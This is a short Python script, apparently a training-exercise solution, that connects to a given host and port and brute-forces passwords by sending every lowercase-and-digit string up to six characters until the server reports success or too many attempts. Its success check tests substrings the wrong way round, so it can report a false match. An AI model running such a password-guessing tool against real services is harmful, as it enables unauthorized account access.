import argparse
import socket
import itertools
import string
import logging
import inspect


# write your code here
def logger(func):
    def wrap(*args, **kwargs):
        logging.info(
            f"{func.__name__} - line no: {inspect.getframeinfo(inspect.currentframe().f_back).lineno} with args: {args}, kwargs: {kwargs}")
        # Log the function name and arguments

        # Call the original function
        result = func(*args, **kwargs)

        # Log the return value
        logging.info(f"{func.__name__} returned: {result}")

        # Return the result
        return result

    return wrap


@logger
def set_args():
    parser = argparse.ArgumentParser(description="Commandline inputs to start Hacking Password script.")
    parser.add_argument("ip_address", type=str,
                        help="like localhost or 127.0.0.1")
    parser.add_argument("port", type=int,
                        help="like 8080")
    parser.add_argument("message", nargs="*",
                        help="string that you want to send, like this is a test",
                        default="")
    return parser


@logger
def get_args() -> argparse:
    parser = set_args()
    return parser.parse_args()


# @logger
def get_brute_force_pass(length: int = 6):
    char_list = string.ascii_lowercase + string.digits
    for i in range(1, length + 1):
        for combo in itertools.product(char_list, repeat=i):
            yield ''.join(combo)


@logger
def send_message_and_get_response(hostname: str, port: int, message: str = "") -> socket:
    with socket.socket() as client_socket:
        address = (hostname, port)
        client_socket.connect(address)
        found_pass = False
        for password in get_brute_force_pass():
            message = password.encode()
            client_socket.send(message)
            response = client_socket.recv(1024)
            response = response.decode()
            if response in "Connection success!":
                logging.info(["password:", password, "message:", message, "response:", response])
                return password
            elif response in "Too many attempts":
                logging.info([password, message, response])
                return response


@logger
def main():
    args = get_args()
    ans = send_message_and_get_response(args.ip_address,
                                        args.port)
    print(ans)


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO,
                        format='%(asctime)s - %(levelname)s - %(message)s',
                        filename='app.log',  # Specify the file name for logging
                        filemode='w'  # Use 'w' mode to overwrite the log file on each run, or 'a' to append
                        )
    main()
